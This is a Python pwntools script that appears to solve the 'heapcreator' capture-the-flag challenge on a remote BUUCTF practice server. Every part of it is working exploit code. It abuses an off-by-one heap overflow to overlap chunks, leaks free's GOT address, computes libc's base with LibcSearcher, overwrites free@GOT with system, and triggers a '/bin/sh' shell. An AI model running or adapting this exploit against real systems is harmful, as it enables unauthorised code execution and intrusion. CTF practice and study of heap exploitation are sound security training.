from pwn import *
from LibcSearcher import *

# p = process("./heapcreator")
p = remote("node4.buuoj.cn", 27881)
elf = ELF("heapcreator")

def create_heap(heap_len, payload):
    p.sendlineafter("Your choice :", str(1))
    p.sendlineafter("Size of Heap : ", str(heap_len))
    p.sendlineafter("Content of heap:", payload)

def edit_heap(idx, payload):
    p.sendlineafter("Your choice :", str(2))
    p.sendlineafter("Index :", str(idx))
    p.sendlineafter("Content of heap : ", payload)

def show_heap(idx):
    p.sendlineafter("Your choice :", str(3))
    p.sendlineafter("Index :", str(idx))
    
def delete_heap(idx):
    p.sendlineafter("Your choice :", str(4))
    p.sendlineafter("Index :", str(idx))
    
create_heap(0x18, "A")
create_heap(0x18, "B")
create_heap(0x18, "/bin/sh\x00")

payload = p64(0) * 3 + b"\x41"
edit_heap(0, payload)
delete_heap(1)

create_heap(50, "CCCC")

payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(32) + p64(elf.got["free"])
edit_heap(1, payload)
show_heap(1)

p.recvuntil("Content : ")
free_real_addr = u64(p.recv(6).ljust(8, b'\x00'))

libc = LibcSearcher("free", free_real_addr)
libcbase = free_real_addr - libc.dump("free")
system_addr = libcbase + libc.dump("system")

edit_heap(1, p64(system_addr))
delete_heap(2)

p.interactive()